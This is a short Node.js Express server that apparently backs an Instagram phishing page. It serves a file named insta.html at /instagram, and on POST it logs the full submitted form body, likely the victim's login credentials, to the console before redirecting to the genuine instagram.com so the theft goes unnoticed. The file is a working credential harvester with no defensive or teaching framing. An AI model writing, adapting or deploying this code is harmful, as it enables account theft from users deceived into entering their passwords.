const express = require('express');
const app = express();
const path = require('path')
const BASE_PATH = path.join(__dirname, 'public')

app.use('/static', express.static('public'))

app.get('/instagram', (req, res)=>{
    res.sendFile(`${BASE_PATH}/insta.html`)
})

app.listen(1234)

app.post("/instagram", (req, res) =>{
    var body = "";
    req.on("data", function (chunk) {
        body += chunk;
    });
    req.on("end", function () {
        console.log(body);

        res.statusCode = 302;
        res.setHeader("Location", "https://www.instagram.com");

        res.end();
    });
})